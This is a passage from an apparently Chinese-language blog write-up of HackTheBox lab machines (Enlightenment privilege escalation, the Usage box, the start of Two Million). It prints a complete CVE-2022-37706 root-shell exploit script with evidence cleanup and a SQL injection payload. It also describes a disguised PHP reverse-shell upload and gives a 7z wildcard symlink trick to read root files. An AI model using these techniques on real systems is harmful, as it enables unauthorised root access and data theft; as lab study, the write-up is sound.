enlightenment</code> 看到有个提权漏洞，再 <code>searchsploit -p linux/local/51180.txt</code> 看具体信息</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"attr\">Exploit:</span> <span class=\"string\">Enlightenment</span> <span class=\"string\">v0.25.3</span> <span class=\"bullet\">-</span> <span class=\"string\">Privilege</span> <span class=\"string\">escalation</span></span><br><span class=\"line\">      <span class=\"attr\">URL:</span> <span class=\"string\">https://www.exploit-db.com/exploits/51180</span></span><br><span class=\"line\">     <span class=\"attr\">Path:</span> <span class=\"string\">/usr/share/exploitdb/exploits/linux/local/51180.txt</span></span><br><span class=\"line\">    <span class=\"attr\">Codes:</span> <span class=\"string\">CVE-2022-37706</span></span><br><span class=\"line\"> <span class=\"attr\">Verified:</span> <span class=\"literal\">False</span></span><br><span class=\"line\"><span class=\"attr\">File Type:</span> <span class=\"string\">ASCII</span> <span class=\"string\">text</span></span><br></pre></td></tr></table></figure>\n\n<p><code>cat /usr/share/exploitdb/exploits/linux/local/51180.txt</code>，里面说这个洞能打 0.25.3 以下版本，也给出了 PoC 如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/usr/bin/bash</span></span><br><span class=\"line\"><span class=\"comment\"># Idea by MaherAzzouz</span></span><br><span class=\"line\"><span class=\"comment\"># Development by nu11secur1ty</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;CVE-2022-37706&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[*] Trying to find the vulnerable SUID file...&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[*] This may take few seconds...&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># The actual problem</span></span><br><span class=\"line\">file=$(find / -name enlightenment_sys -perm -4000 2&gt;/dev/null | <span class=\"built_in\">head</span> -1)</span><br><span class=\"line\"><span class=\"keyword\">if</span> [[ -z <span class=\"variable\">$&#123;file&#125;</span> ]]</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;[-] Couldn&#x27;t find the vulnerable SUID file...&quot;</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">&quot;[*] Enlightenment should be installed on your system.&quot;</span></span><br><span class=\"line\">        <span class=\"built_in\">exit</span> 1</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[+] Vulnerable SUID binary found!&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[+] Trying to pop a root shell!&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p /tmp/net</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> -p <span class=\"string\">&quot;/dev/../tmp/;/tmp/exploit&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;/bin/sh&quot;</span> &gt; /tmp/exploit</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> a+x /tmp/exploit</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;[+] Welcome to the rabbit hole :)&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$&#123;file&#125;</span> /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(<span class=\"built_in\">id</span> -u), <span class=\"string\">&quot;/dev/../tmp/;/tmp/exploit&quot;</span> /tmp///net</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">read</span> -p <span class=\"string\">&quot;Press any key to clean the evedence...&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> -e <span class=\"string\">&quot;Please wait... &quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 5</span><br><span class=\"line\"><span class=\"built_in\">rm</span> -rf /tmp/exploit</span><br><span class=\"line\"><span class=\"built_in\">rm</span> -rf /tmp/net</span><br><span class=\"line\"><span class=\"built_in\">echo</span> -e <span class=\"string\">&quot;Done; Everything is clear ;)&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>中间的 <code>$&#123;file&#125;</code> 那行不知道为啥断行了，给它三句连起来，记得加空格。<br>在靶机执行拿到 root 的 shell，读 <code>root.txt</code> 拿到第二个 flag。</p>\n<h2 id=\"Usage\"><a href=\"#Usage\" class=\"headerlink\" title=\"Usage\"></a>Usage</h2><p>扫端口只有 80 和 22，老样子，先加 host</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo <span class=\"built_in\">echo</span> <span class=\"string\">&quot;10.10.11.18    http://usage.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>\n\n<p>然后访问，是一个登录页面，用 whatweb 看眼，发现是 Laravel</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ whatweb http://usage.htb/</span><br><span class=\"line\">http://usage.htb/ [200 OK] Bootstrap[4.1.3], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.11.18], Laravel, PasswordField[password], Title[Daily Blogs], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]</span><br></pre></td></tr></table></figure>\n\n<p>在 <a href=\"https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-web/laravel\">Hacktricks</a> 上有说存在 SQL 注入漏洞，测一下<br>先注册一个 <code>a@a.com</code> 的用户，再在重置密码的 <code>email</code> 项输入 <code>a@a.com&#39;</code>，发现引号能触发 500 错误，说明存在注入。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a<span class=\"variable\">@a</span>.com<span class=\"string\">&#x27; AND 1=1;-- -</span></span><br></pre></td></tr></table></figure>\n\n<p>上面的语句的 response 是成功执行。于是把请求体复制到 request.txt，用 sqlmap 跑</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">POST</span> <span class=\"string\">http://usage.htb/forget-password</span> <span class=\"string\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attr\">Host:</span> <span class=\"string\">usage.htb</span></span><br><span class=\"line\"><span class=\"attr\">Content-Length:</span> <span class=\"number\">84</span></span><br><span class=\"line\"><span class=\"attr\">Cache-Control:</span> <span class=\"string\">max-age=0</span></span><br><span class=\"line\"><span class=\"attr\">Upgrade-Insecure-Requests:</span> <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">Origin:</span> <span class=\"string\">http://usage.htb</span></span><br><span class=\"line\"><span class=\"attr\">Content-Type:</span> <span class=\"string\">application/x-www-form-urlencoded</span></span><br><span class=\"line\"><span class=\"attr\">User-Agent:</span> <span class=\"string\">Mozilla/5.0</span> <span class=\"string\">(Windows</span> <span class=\"string\">NT</span> <span class=\"number\">10.0</span><span class=\"string\">;</span> <span class=\"string\">Win64;</span> <span class=\"string\">x64)</span> <span class=\"string\">AppleWebKit/537.36</span> <span class=\"string\">(KHTML,</span> <span class=\"string\">like</span> <span class=\"string\">Gecko)</span> <span class=\"string\">Chrome/123.0.6312.122</span> <span class=\"string\">Safari/537.36</span></span><br><span class=\"line\"><span class=\"attr\">Accept:</span> <span class=\"string\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class=\"line\"><span class=\"attr\">Referer:</span> <span class=\"string\">http://usage.htb/forget-password</span></span><br><span class=\"line\"><span class=\"attr\">Accept-Encoding:</span> <span class=\"string\">gzip,</span> <span class=\"string\">deflate,</span> <span class=\"string\">br</span></span><br><span class=\"line\"><span class=\"attr\">Accept-Language:</span> <span class=\"string\">zh-CN,zh;q=0.9</span></span><br><span class=\"line\"><span class=\"attr\">Cookie:</span> <span class=\"string\">XSRF-TOKEN=eyJpdiI6IkhFakpQK2l4cU5sYkhHZzZoN00rUmc9PSIsInZhbHVlIjoiYysvaTY0WDl1dXBXMGR2TzM5YWt2aEg4T051akNzTDFxcWJzUC9yY3pPajN4ei9FRTRJbzNuQ2htY0pmc25xWGR5anV6UzFHTkJ1N2tYYWlJcUEzNjZnSmNVMzdaa0hWNWlST3BVeTlqUnpBdVJ0aEVlOTVUSnBlNXdTa29UTk8iLCJtYWMiOiI0NzIxOTRkMTk4ZWEyN2E2YjI1YTA1NzI4ODg3MzFjZWM0YjJkZGRhNTZjOWYxZGVkNmRjMWRkNTYyNzYzMjUwIiwidGFnIjoiIn0%3D;</span> <span class=\"string\">laravel_session=eyJpdiI6IktHWU1MYzFSNDBvSEN1M2dRSVJlTmc9PSIsInZhbHVlIjoib1FJU1RXWWxPV0ZRem5NNGJxUzR1QkdCdFpYMm8yWGxNblhFL0hIaFdnOWxSK3c0bStqNk9wY1Jsd3ZPZHFTTkdCWjByMnJNTkNnV21hZVJrZGZZcTdBbTFpT3YzOVBubENxT09FWTdBQlhPdEZoTGExMnZHdUZXZ0svOEF5cHkiLCJtYWMiOiI1NWNhNDg3OWZmOTEzNjkzNDMxZGNkZDVjODljMzBkMTRkYzcwZjU2MjI4ZDk5NTBkNzAxOTdhMzlkNTk3MzAxIiwidGFnIjoiIn0%3D</span></span><br><span class=\"line\"><span class=\"attr\">Connection:</span> <span class=\"string\">close</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">_token=KwTPctNAzmgzsn7wIgf7PC16p7nJ52U7AGT0MNHQ&amp;email=a%40a.com</span> <span class=\"comment\"># 注意这里用手注的 payload</span></span><br></pre></td></tr></table></figure>\n\n<p>&lt;这里想起来就补&gt;</p>\n<p>用 john 爆出密码 <code>whatever1</code>，在 <code>admin.usage.htb</code> 登录。<br>发现没什么能做的，只有头像能改，测试只有前端有文件后缀校验，于是传一个 PHP 反弹 shell 的 png 上去，再用 burp 改成 .php 再传一次，刷新页面，拿到 shell。<br>传 linpeas.sh 开扫，发现 <code>/home/dash/.ssh/id_rsa</code>，下到本地，登录</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">chmod</span> 600 dash.pri  <span class=\"comment\"># 不然不给连</span></span><br><span class=\"line\">ssh -i dash.pri dash@10.10.11.18</span><br></pre></td></tr></table></figure>\n\n<p><code>/home/dash</code> 目录下有个 <code>.monitrc</code>，内容如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Monitoring Interval in Seconds</span></span><br><span class=\"line\"><span class=\"built_in\">set</span> daemon  60</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Enable Web Access</span></span><br><span class=\"line\"><span class=\"built_in\">set</span> httpd port 2812</span><br><span class=\"line\">     use address 127.0.0.1</span><br><span class=\"line\">     allow admin:3nc0d3d_pa$<span class=\"variable\">$w0rd</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Apache</span></span><br><span class=\"line\">check process apache with pidfile <span class=\"string\">&quot;/var/run/apache2/apache2.pid&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> cpu &gt; 80% <span class=\"keyword\">for</span> 2 cycles <span class=\"keyword\">then</span> alert</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#System Monitoring</span></span><br><span class=\"line\">check system usage</span><br><span class=\"line\">    <span class=\"keyword\">if</span> memory usage &gt; 80% <span class=\"keyword\">for</span> 2 cycles <span class=\"keyword\">then</span> alert</span><br><span class=\"line\">    <span class=\"keyword\">if</span> cpu usage (user) &gt; 70% <span class=\"keyword\">for</span> 2 cycles <span class=\"keyword\">then</span> alert</span><br><span class=\"line\">        <span class=\"keyword\">if</span> cpu usage (system) &gt; 30% <span class=\"keyword\">then</span> alert</span><br><span class=\"line\">    <span class=\"keyword\">if</span> cpu usage (<span class=\"built_in\">wait</span>) &gt; 20% <span class=\"keyword\">then</span> alert</span><br><span class=\"line\">    <span class=\"keyword\">if</span> loadavg (1min) &gt; 6 <span class=\"keyword\">for</span> 2 cycles <span class=\"keyword\">then</span> alert</span><br><span class=\"line\">    <span class=\"keyword\">if</span> loadavg (5min) &gt; 4 <span class=\"keyword\">for</span> 2 cycles <span class=\"keyword\">then</span> alert</span><br><span class=\"line\">    <span class=\"keyword\">if</span> swap usage &gt; 5% <span class=\"keyword\">then</span> alert</span><br><span class=\"line\"></span><br><span class=\"line\">check filesystem rootfs with path /</span><br><span class=\"line\">       <span class=\"keyword\">if</span> space usage &gt; 80% <span class=\"keyword\">then</span> alert</span><br></pre></td></tr></table></figure>\n\n<p>这里就藏着 xander 的密码 <code>3nc0d3d_pa$$w0rd</code>（感觉有点脑洞）<br>登录后 <code>sudo -l</code> 看一眼，发现可以 <code>sudo /usr/bin/usage_management</code>，把文件拖下看用 IDA 看一眼</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Choose an option:&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1. Project Backup&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2. Backup MySQL data&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;3. Reset admin password&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Enter your choice (1/2/3): &quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%d&quot;</span>, &amp;v4);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v4 == <span class=\"number\">3</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    resetAdminPassword();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 &gt; <span class=\"number\">3</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">LABEL_9:</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invalid choice.&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v4 == <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      backupWebContent();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v4 != <span class=\"number\">2</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_9;</span><br><span class=\"line\">      backupMysqlData();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>发现 <code>resetAdminPassword</code> 是用来消遣你的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">resetAdminPassword</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Password has been reset.&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">backupWebContent</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( chdir(<span class=\"string\">&quot;/var/www/html&quot;</span>) )</span><br><span class=\"line\">    perror(<span class=\"string\">&quot;Error changing working directory to /var/www/html&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    system(<span class=\"string\">&quot;/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">backupMysqlData</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> system(<span class=\"string\">&quot;/usr/bin/mysqldump -A &gt; /var/backups/mysql_backup.sql&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>来分析一下这句命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *</span><br></pre></td></tr></table></figure>\n\n<p><code>7za</code> 是 7zip 的命令行版本，<code>a</code> 是添加文件到压缩包，位置为 <code>/var/backups/project.zip</code>，<code>-tzip</code> 指定压缩格式为 zip，<code>-snl</code> 将符号链接作为链接存储，即不是压缩其指向的内容，<code>-mmt</code> 是多线程压缩，<code>--</code> 结束选项，<code>*</code> 压缩所有文件。<br><a href=\"https://book.hacktricks.xyz/v/cn/linux-hardening/privilege-escalation/wildcards-spare-tricks\">Hacktricks</a> 提到了利用这个的 trick，在 7z 中，<code>@</code> 开头的文件名会被当作文件列表，所以如下命令执行的时候 7z 会把 <code>root.txt</code> 当作文件列表，然后尝试对 <code>root.txt</code> 里列出的文件进行压缩</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /var/www/html</span><br><span class=\"line\"><span class=\"built_in\">touch</span> @root.txt</span><br><span class=\"line\"><span class=\"built_in\">ln</span> -s /root/root.txt root.txt</span><br></pre></td></tr></table></figure>\n\n<p>然后再执行备份命令，就能在报错信息看到 root.txt 的内容了。</p>\n<blockquote>\n<p>软链接与硬链接<br>  这里说一下软链接与硬链接的区别，软链接类似 Windows 中的快捷方式，可以跨越文件系统，硬链接则不行。所有硬链接，包括原文件指向的都是同一个 inode（索引节点），众生平等，除非只剩最后一个，否则删除一个硬链接不会影响其他硬链接，而软链接则不同，删除原文件会导致软链接失效。<br>  生成方法上，软链接 <code>ln -s</code>；硬链接 <code>ln</code>，目录则需要 <code>cp -al /path/to/dir /path/to/link</code>。<br>  一般来说，软链接用得多，硬链接用得少。</p>\n</blockquote>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p>Two Million<br><a href=\"https://h4r1337.github.io/posts/two-million/\">https://h4r1337.github.io/posts/two-million/</a><br><a href=\"https://blog.csdn.net/song_lee/article/details/131245481\">https://blog.csdn.net/song_lee/article/details/131245481</a><br>Mailing<br><a href=\"https://blog.csdn.net/m0_52742680/article/details/138482768\">https://blog.csdn.net/m0_52742680/article/details/138482768</a><br><a href=\"https://blog.csdn.net/whale_waves/article/details/138896310\">https://blog.csdn.net/whale_waves/article/details/138896310</a><br>BoardLight<br><a href=\"https://blog.csdn.net/m0_52742680/article/details/139233464\">https://blog.csdn.net/m0_52742680/article/details/139233464</a><br><a href=\"https://blog.csdn.net/2201_75526400/article/details/139304432\">https://blog.csdn.net/2201_75526400/article/details/139304432</a><br>Usage<br><a href=\"https://blog.csdn.net/zr1213159840/article/details/124548770\">https://blog.csdn.net/zr1213159840/article/details/124548770</a><br><a href=\"https://amandaguglieri.github.io/hackinglife/htb-usage/\">https://amandaguglieri.github.io/hackinglife/htb-usage/</a></p>\n","excerpt":"<p>不得不找饭吃了。<br>Two Million / Mailing / BoardLight / Usage</p>","more":"<h2 id=\"配置\"><a href=\"#配置\" class=\"headerlink\" title=\"配置\"></a>配置</h2><p>国内访问比较慢，生成 VPN 的时候选 TCP，然后在下载的 <code>.ovpn</code> 文件里加一行 <code>http-proxy ip:port</code>，再用 <code>openvpn</code> 连接就行了，快很多。</p>\n<h2 id=\"新手村\"><a href=\"#新手村\" class=\"headerlink\" title=\"新手村\"></a>新手村</h2><p>四道基础题，基本就是 nmap 扫。<br>主要记住一些参数，比如 <code>-p-</code> 扫描所有端口，<code>--min-rate &lt;num&gt;</code> 设置扫描速率，<code>-n</code> 不解析域名，<code>-sS</code> SYN 扫描，<code>-Pn</code> 不 ping 主机，<code>--open</code> 只显示开放端口，<code>--stats-every &lt;num&gt;</code> 每扫描多少个端口显示一次统计信息，<code>-vv</code> 详细输出。</p>\n<h2 id=\"Two-Million\"><a href=\"#Two-Million\" class=\"headerlink\" title=\"Two Million\"></a>Two Million</h2><p>扫出来两个端口，一个是 80，一个是 22。</p>\n<p>访问 80 端口，301 到 2million.htb，改 <code>etc/host</code> 加一行 <code>10.10.11.221    2million.htb</code>，再访问，发现是个登录页面。<br>根据提示找到 <code>inviteapi.min.js</code>，内容如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">eval</span>(</span><br><span class=\"line\">  <span class=\"keyword\">function</span> (<span class=\"params\">p, a, c, k, e, d</span>) &#123;</span><br><span class=\"line\">    e = <span class=\"keyword\">function</span> (<span class=\"params\">c</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> c.<span class=\"title function_\">toString</span>(<span class=\"number\">36</span>)</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"string\">&#x27;&#x27;</span>.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^/</span>, <span class=\"title class_\">String</span>)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">while</span> (c--) &#123;</span><br><span class=\"line\">        d[c.<span class=\"title function_\">toString</span>(a)] = k[c] ||</span><br><span class=\"line\">        c.<span class=\"title function_\">toString</span>(a)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      k = [</span><br><span class=\"line\">        <span class=\"keyword\">function</span> (<span class=\"params\">e</span>) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">return</span> d[e]</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      ];</span><br><span class=\"line\">      e = <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;\\\\w+&#x27;</span></span><br><span class=\"line\">      &#125;;</span><br><span class=\"line\">      c = <span class=\"number\">1</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (c--) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (k[c]) &#123;</span><br><span class=\"line\">        p = p.<span class=\"title function_\">replace</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">RegExp</span>(<span class=\"string\">&#x27;\\\\b&#x27;</span> + <span class=\"title function_\">e</span>(c) + <span class=\"string\">&#x27;\\\\b&#x27;</span>, <span class=\"string\">&#x27;g&#x27;</span>), k[c])</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p</span><br><span class=\"line\">  &#125;(</span><br><span class=\"line\">    <span class=\"string\">&#x27;1 i(4)&#123;h 8=&#123;&quot;4&quot;:4&#125;;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,g:8,b:\\&#x27;/d/e/n\\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;1 